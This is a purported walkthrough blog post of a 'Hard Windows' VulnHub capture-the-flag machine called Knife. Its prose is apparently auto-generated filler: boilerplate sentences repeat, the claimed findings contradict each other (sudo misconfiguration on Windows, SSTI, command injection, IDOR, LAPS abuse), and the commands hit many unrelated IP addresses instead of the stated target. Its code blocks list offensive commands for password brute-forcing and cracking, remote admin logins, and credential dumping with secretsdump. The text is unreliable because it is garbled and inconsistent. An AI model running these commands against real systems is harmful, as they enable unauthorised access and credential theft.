---
TitleSEO: "VulnHub — Knife (Hard Windows) | ZureFX"
TitlePost: "VulnHub — Knife (Hard Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Knife. IDOR and LAPS Abuse to achieve hard compromise on Windows."
Keywords: "insane, active directory, hackthebox, forensics, tryhackme, offsec, reversing"
URL: "https://zurefx.github.io/writeups/htb-knife-924.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-knife-924/"
Date: "2025-07-15"
Tags: "Insane, Active Directory, HackTheBox, Forensics, TryHackMe, OffSec, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-knife-924"
Permalink: "/writeups/htb-knife-924.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Knife** is rated **Hard** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.44.32.72`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
gobuster dir -u http://10.105.199.106/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.74.141.175/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.129.106.23 -u administrator -p 'P@ssw0rd!'
```

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
nmap -sCV -p3306,3268,21 10.17.61.118 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

### SMB Enumeration

Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

```bash
nmap -sCV -p9200,5432,464 10.94.129.192 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.88.120.21 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.29.15.159/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p21,1433,587 10.16.73.193 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. Initial enumeration revealed several interesting open ports on the target. Lateral movement was facilitated by reusing discovered credentials across services.

## Exploitation

### Vulnerability Identification

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **LAPS Abuse**.

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
evil-winrm -i 10.120.84.171 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.91.212.41/FUZZ
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.111.147.48/FUZZ
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism. Privilege escalation was possible due to misconfigured sudo permissions.

```powershell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.125.224.112 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Exploitation

Token impersonation allowed elevation to SYSTEM privileges on the target. The service account had excessive permissions assigned in Active Directory.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.58.180.6
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.112.137
crackmapexec smb 10.92.41.116 -u administrator -p 'P@ssw0rd!' --shares
```

Group Policy Preferences contained encrypted but recoverable credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Unconstrained delegation was enabled on the compromised machine. Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `netcat`
- `metasploit`
- `hashcat`
- `gobuster`

### Key Takeaways

- IDOR
- LAPS Abuse
